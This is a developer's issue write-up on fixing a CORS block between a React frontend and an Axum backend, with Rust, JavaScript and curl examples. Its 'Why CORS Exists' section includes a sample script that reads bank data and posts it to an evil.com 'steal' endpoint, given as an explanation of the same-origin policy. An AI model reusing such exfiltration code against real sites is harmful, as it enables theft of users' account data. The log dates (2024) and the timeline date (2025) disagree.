# Issue #6: CORS Policy Blocking Frontend Requests

## Problem Description

After successfully getting both frontend and backend containers running, the frontend could not communicate with the backend. When clicking the "Fetch Message" button in the React application, the browser console showed:

```
Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote
resource at http://localhost:3000/message. (Reason: CORS header 'Access-Control-Allow-Origin' missing).
```

The HTTP request was sent, but the browser blocked the response from being read by the JavaScript code due to missing CORS headers.

## Technical Details

### What Happened

1. User clicked "Fetch Message" button in React app (port 5173)
2. JavaScript sent `fetch('http://localhost:3000/message')`
3. Browser sent HTTP request to backend (port 3000)
4. Backend received request and sent response
5. **Browser checked for CORS headers in response**
6. No `Access-Control-Allow-Origin` header found
7. Browser blocked JavaScript from reading the response
8. Console error displayed
9. Frontend showed no message

### Request Flow Analysis

**Frontend (React on port 5173):**

```javascript
// src/App.jsx
const fetchMessage = async () => {
  const response = await fetch("http://localhost:3000/message");
  const data = await response.text();
  setMessage(data);
};
```

**Backend (Axum on port 3000):**

```rust
// src/handlers/mod.rs
pub async fn initial_page() {
    // Returns nothing
}
```

**Network Tab in Browser:**

```
Request URL: http://localhost:3000/message
Request Method: GET
Status Code: 200 OK
Remote Address: 127.0.0.1:3000

Response Headers:
content-length: 0
date: Wed, 20 Nov 2024 19:30:15 GMT
```

**Notice:** No `access-control-allow-origin` header!

### Why CORS Blocking Occurred

**Origin Mismatch:**

- Frontend Origin: `http://localhost:5173`
- Backend Origin: `http://localhost:3000`
- Different ports = Different origins

**Same-Origin Policy:**

Browsers enforce that JavaScript can only fetch resources from the **same origin** unless the server explicitly allows it.

**What is an origin?**

```
Origin = Protocol + Domain + Port

http://localhost:5173  → Origin A
http://localhost:3000  → Origin B  (different port!)
```

**Cross-Origin Request:**

When React (origin A) fetches from Axum (origin B), this is a **cross-origin request**.

Browser's security rule:

1. Allow the request to be sent
2. Server sends response
3. **Check response headers for CORS permission**
4. If no permission → block JavaScript from reading response
5. Throw error in console

### Backend Handler Issue (Secondary Problem)

The backend handler also had an issue - it returned nothing:

```rust
pub async fn initial_page() {
    // No return value!
}
```

Axum expected a return type. This compiled because Rust allows `()` (unit type), but resulted in an empty response body and potentially incorrect content-type.

## Root Cause Analysis

### Primary Cause: No CORS Configuration

**Axum Router Without CORS:**

```rust
// src/main.rs
#[tokio::main]
async fn main() {
    let app = Router::new()
        .route("/message", get(initial_page));

    // No CORS layer added!

    let listener = tokio::net::TcpListener::bind("0.0.0.0:3000")
        .await
        .unwrap();

    axum::serve(listener, app).await.unwrap();
}
```

**What this does:**

- Accepts HTTP requests
- Processes them
- Returns responses
- **But doesn't add CORS headers**

**What browsers need:**

```
Access-Control-Allow-Origin: http://localhost:5173
```

or

```
Access-Control-Allow-Origin: *
```

Without this header, browsers refuse to let JavaScript access the response.

### Why CORS Wasn't Configured Initially

**Development Workflow:**

1. Backend was developed and tested with `curl`:

   ```bash
   $ curl http://localhost:3000/message
   # Works fine - curl doesn't enforce CORS
   ```

2. Backend tested with Postman:

   ```
   GET http://localhost:3000/message
   # Works fine - Postman doesn't enforce CORS
   ```

3. Backend integrated with frontend:
   ```javascript
   fetch("http://localhost:3000/message");
   // ❌ Blocked by CORS - browsers DO enforce it
   ```

**The disconnect:** curl and Postman don't enforce CORS, so the issue wasn't discovered until browser testing.

### Understanding CORS Headers

**What the browser checks:**

1. **Simple Request (GET with no custom headers):**

   - Browser sends request
   - Checks response for `Access-Control-Allow-Origin`
   - If present and matches → allow
   - If missing → block

2. **Preflight Request (POST, custom headers):**
   - Browser sends OPTIONS request first (preflight)
   - Server must respond with CORS headers
   - If OK, browser sends actual request
   - Checks actual response for CORS headers

**Required Headers:**

Minimum:

```
Access-Control-Allow-Origin: http://localhost:5173
```

For full support:

```
Access-Control-Allow-Origin: http://localhost:5173
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 3600
```

### Axum and Tower-HTTP

Axum uses Tower middleware layers. CORS is provided by `tower-http`:

```toml
[dependencies]
tower-http = { version = "0.6.6", features = ["cors"] }
```

**Without this dependency:**

- No CORS middleware available
- Must manually add headers to each response
- Error-prone and repetitive

**With tower-http:**

- Add one layer to router
- Automatically adds CORS headers to all responses
- Configurable and maintainable

## How the Error Occurred

**Development Timeline:**

1. **Backend Development:**

   ```bash
   cargo new backend
   cd backend
   cargo add axum tokio
   ```

   ```rust
   // Basic Axum server
   #[tokio::main]
   async fn main() {
       let app = Router::new()
           .route("/message", get(initial_page));
       // ...
   }
   ```

2. **Testing with curl:**

   ```bash
   $ curl http://localhost:3000/message
   # Empty response, but no error
   ```

   Developer thought: "It works!"

3. **Frontend Development:**

   ```javascript
   // App.jsx
   const fetchMessage = async () => {
     const response = await fetch("http://localhost:3000/message");
     // ...
   };
   ```

4. **First Browser Test:**

   - Clicked button
   - Saw error: "CORS header 'Access-Control-Allow-Origin' missing"
   - Confusion: "But curl worked!"

5. **Realization:**
   - Browsers enforce CORS
   - curl doesn't
   - Need to add CORS to backend

### Why Testing Order Mattered

| Testing Tool    | CORS Enforced | Result     |
| --------------- | ------------- | ---------- |
| curl            | ❌ No         | ✅ Works   |
| Postman         | ❌ No         | ✅ Works   |
| wget            | ❌ No         | ✅ Works   |
| Browser (fetch) | ✅ Yes        | ❌ Blocked |

**Lesson:** Always test with actual browser/frontend early in development.

## Solution Implementation

### Step 1: Add tower-http Dependency

Update `Cargo.toml`:

```toml
[dependencies]
axum = "0.8.7"
tokio = { version = "1.48.0", features = ["full"] }
tower-http = { version = "0.6.6", features = ["cors"] }  # ← Added
```

**Why `features = ["cors"]`?**

tower-http is modular. CORS is an optional feature to keep the library lightweight. Must explicitly enable it.

### Step 2: Configure CORS Layer

Update `src/main.rs`:

```rust
use axum::{
    routing::get,
    Router,
};
use tower_http::cors::CorsLayer;  // ← Import CORS

#[tokio::main]
async fn main() {
    // Create CORS layer
    let cors = CorsLayer::permissive();  // ← Allow all origins (development)

    let app = Router::new()
        .route("/message", get(handlers::initial_page))
        .layer(cors);  // ← Add CORS layer to router

    let listener = tokio::net::TcpListener::bind("0.0.0.0:3000")
        .await
        .unwrap();

    println!("🚀 Server running on http://0.0.0.0:3000");

    axum::serve(listener, app).await.unwrap();
}
```

**What `CorsLayer::permissive()` does:**

Adds these headers to all responses:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
```

This allows **any** origin to access the API.

### Step 3: Fix Backend Handler Return Type

Also fixed the handler to actually return something:

**Before:**

```rust
pub async fn initial_page() {
    // Returns nothing
}
```

**After:**

```rust
pub async fn initial_page() -> &'static str {
    "Hello from backend!"
}
```

**Why this matters:**

- Axum handlers must return something
- `&'static str` is a simple response type
- Automatically sets `content-type: text/plain`
- Provides actual data for frontend

### Complete Working Configuration

**backend/src/main.rs:**

```rust
use axum::{
    routing::get,
    Router,
};
use tower_http::cors::CorsLayer;

mod handlers;

#[tokio::main]
async fn main() {
    // CORS configuration
    let cors = CorsLayer::permissive();

    // Router with CORS
    let app = Router::new()
        .route("/message", get(handlers::initial_page))
        .layer(cors);

    // Bind to all interfaces
    let listener = tokio::net::TcpListener::bind("0.0.0.0:3000")
        .await
        .unwrap();

    println!("🚀 Server running on http://0.0.0.0:3000");

    axum::serve(listener, app).await.unwrap();
}
```

**backend/src/handlers/mod.rs:**

```rust
pub async fn initial_page() -> &'static str {
    "Hello from backend!"
}
```

**frontend/src/App.jsx:**

```javascript
import { useState } from "react";

function App() {
  const [message, setMessage] = useState("");

  const fetchMessage = async () => {
    try {
      const response = await fetch("http://localhost:3000/message");
      const data = await response.text();
      setMessage(data);
    } catch (error) {
      console.error("Error:", error);
    }
  };

  return (
    <div>
      <button onClick={fetchMessage}>Fetch Message</button>
      <p>{message}</p>
    </div>
  );
}

export default App;
```

## Verification

### Test 1: Check CORS Headers

```bash
$ curl -I http://localhost:3000/message
HTTP/1.1 200 OK
content-type: text/plain; charset=utf-8
access-control-allow-origin: *          ← Present!
access-control-allow-methods: *         ← Present!
access-control-allow-headers: *         ← Present!
content-length: 19
date: Wed, 20 Nov 2024 20:15:30 GMT
```

✅ CORS headers are present

### Test 2: Browser DevTools Network Tab

**Request:**

```
GET http://localhost:3000/message
```

**Response Headers:**

```
access-control-allow-origin: *
access-control-allow-methods: *
access-control-allow-headers: *
content-type: text/plain; charset=utf-8
content-length: 19
```

**Response Body:**

```
Hello from backend!
```

✅ No CORS errors in console  
✅ Response accessible to JavaScript

### Test 3: Frontend Functionality

1. Open `http://localhost:5173` in browser
2. Click "Fetch Message" button
3. See "Hello from backend!" displayed
4. No errors in console

✅ Frontend successfully communicates with backend

### Test 4: Preflight Requests

Test OPTIONS preflight:

```bash
$ curl -X OPTIONS http://localhost:3000/message \
  -H "Origin: http://localhost:5173" \
  -H "Access-Control-Request-Method: GET"

HTTP/1.1 200 OK
access-control-allow-origin: *
access-control-allow-methods: *
access-control-allow-headers: *
```

✅ Preflight requests handled correctly

## Alternative Solutions

### Option 1: Restrict to Specific Origin (Production)

Instead of allowing all origins, restrict to your frontend:

```rust
use tower_http::cors::{CorsLayer, AllowOrigin};
use http::HeaderValue;

let cors = CorsLayer::new()
    .allow_origin("http://localhost:5173".parse::<HeaderValue>().unwrap())
    .allow_methods([Method::GET, Method::POST])
    .allow_headers([CONTENT_TYPE, AUTHORIZATION]);
```

**Response header:**

```
Access-Control-Allow-Origin: http://localhost:5173
```

**Pros:**

- More secure
- Only specified origin can access
- Better for production

**Cons:**

- Must update for different environments
- More complex configuration

**When to use:** Production deployments

### Option 2: Dynamic Origin Based on Environment

```rust
use std::env;

let allowed_origin = env::var("FRONTEND_URL")
    .unwrap_or_else(|_| "http://localhost:5173".to_string());

let cors = CorsLayer::new()
    .allow_origin(allowed_origin.parse::<HeaderValue>().unwrap());
```

**Pros:**

- Environment-specific configuration
- Works in dev and prod
- Secure

**Cons:**

- Requires environment variables
- More setup

**When to use:** Multiple environments (dev, staging, prod)

### Option 3: Middleware Per Route

Add CORS only to specific routes:

```rust
let app = Router::new()
    .route("/message", get(initial_page))
    .layer(cors)  // CORS only on /message
    .route("/internal", get(internal_handler));  // No CORS
```

**Pros:**

- Fine-grained control
- Internal APIs stay restricted
- Public APIs are accessible

**Cons:**

- More complex routing
- Easy to forget for new routes

**When to use:** Mixed public/private APIs

### Option 4: Proxy (No Backend CORS Changes)

Use Vite's proxy feature:

**vite.config.js:**

```javascript
export default {
  server: {
    proxy: {
      "/api": {
        target: "http://localhost:3000",
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/api/, ""),
      },
    },
  },
};
```

**Frontend code:**

```javascript
fetch("/api/message"); // Proxied to http://localhost:3000/message
```

**Pros:**

- No backend changes needed
- Same-origin to browser
- Avoids CORS entirely

**Cons:**

- Only works in development
- Production needs different solution
- More complex configuration

**When to use:** Development only, backend can't be modified

## Understanding CORS In-Depth

### What is an Origin?

**Origin = Protocol + Host + Port**

Examples:

```
http://localhost:5173     ← Origin 1
http://localhost:3000     ← Origin 2 (different port)
https://localhost:5173    ← Origin 3 (different protocol)
http://127.0.0.1:5173     ← Origin 4 (different host)
http://example.com:5173   ← Origin 5 (different domain)
```

All different origins!

### Simple vs Preflighted Requests

**Simple Request:**

- Methods: GET, HEAD, POST
- Headers: Accept, Accept-Language, Content-Language, Content-Type (limited)
- Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain

Browser sends request directly, checks CORS headers in response.

**Preflighted Request:**

- Methods: PUT, DELETE, PATCH
- Custom headers: Authorization, X-Custom-Header
- Content-Type: application/json

Browser sends OPTIONS request first:

```
OPTIONS /message HTTP/1.1
Origin: http://localhost:5173
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type
```

Server must respond with CORS headers:

```
Access-Control-Allow-Origin: http://localhost:5173
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: Content-Type
```

Then browser sends actual request.

### Why CORS Exists

**Security Scenario:**

You're logged into `bank.com`. A malicious site `evil.com` has this JavaScript:

```javascript
// Try to steal your data
fetch("https://bank.com/api/account")
  .then((res) => res.json())
  .then((data) => {
    // Send your bank data to evil server
    fetch("https://evil.com/steal", {
      method: "POST",
      body: JSON.stringify(data),
    });
  });
```

**Without CORS:**

- evil.com can read your bank.com data
- Your cookies are sent automatically
- Massive security vulnerability

**With CORS:**

- Browser sends request to bank.com
- bank.com responds without CORS headers
- **Browser blocks evil.com from reading response**
- Your data is safe

CORS protects YOU (the user) from malicious websites.

### Tower Middleware Layers

Axum uses Tower's layer system:

```rust
let app = Router::new()
    .route("/", get(handler))
    .layer(layer1)
    .layer(layer2)
    .layer(layer3);
```

**Execution order (onion model):**

```
Request  →  layer3  →  layer2  →  layer1  →  handler
Response ←  layer3  ←  layer2  ←  layer1  ←  handler
```

Each layer can:

- Modify request before passing it on
- Modify response before returning it
- Short-circuit (return early)

**CORS layer:**

- Checks incoming request
- Passes to next layer/handler
- **Adds headers to response**
- Returns modified response

## Prevention Strategies

### 1. Test with Browser Early

Don't rely only on curl/Postman. Test with actual frontend as soon as possible.

**Good workflow:**

```
1. Write backend endpoint
2. Write frontend fetch code
3. Test in browser
4. See CORS error immediately
5. Add CORS before going further
```

### 2. CORS Template/Boilerplate

Create a template with CORS already configured:

**axum-template/src/main.rs:**

```rust
use tower_http::cors::CorsLayer;

let cors = CorsLayer::permissive();  // Already included

let app = Router::new()
    .layer(cors);
```

### 3. Environment-Based Configuration

**Cargo.toml:**

```toml
[dependencies]
tower-http = { version = "0.6.6", features = ["cors"] }
```

**.env.development:**

```
CORS_ORIGIN=*
```

**.env.production:**

```
CORS_ORIGIN=https://your-frontend.com
```

### 4. Documentation

**README.md:**

```markdown
## CORS Configuration

This API uses CORS to allow frontend access.

**Development:** Allows all origins (`*`)
**Production:** Restricted to `https://your-frontend.com`

To change: Update `CORS_ORIGIN` environment variable.
```

## Lessons Learned

1. **Test with actual browsers** - curl doesn't enforce CORS
2. **Add CORS early** - Don't wait until integration
3. **Understand origin rules** - Different ports = different origins
4. **Use `permissive()` for development** - Tighten in production
5. **CORS is client-side security** - Protects users, not your API

## Timeline

- **Issue Discovered:** November 20, 2025 (during frontend-backend integration)
- **Diagnosis Time:** ~5 minutes (error message was clear about CORS)
- **Solution Research:** ~10 minutes (found tower-http CORS documentation)
- **Implementation:** ~5 minutes (add dependency, configure layer)
- **Testing:** ~5 minutes (verify headers, test frontend)
- **Total Time:** ~25 minutes
- **Status:** ✅ Fully Resolved

## Related Commands

**Check CORS headers:**

```bash
curl -I http://localhost:3000/message
```

**Test specific origin:**

```bash
curl http://localhost:3000/message \
  -H "Origin: http://localhost:5173" \
  -v
```

**Test preflight:**

```bash
curl -X OPTIONS http://localhost:3000/message \
  -H "Origin: http://localhost:5173" \
  -H "Access-Control-Request-Method: POST" \
  -v
```

**Check tower-http features:**

```bash
cargo tree -f "{p} {f}"
```

**See response headers in browser:**

```
F12 → Network tab → Click request → Headers tab
```
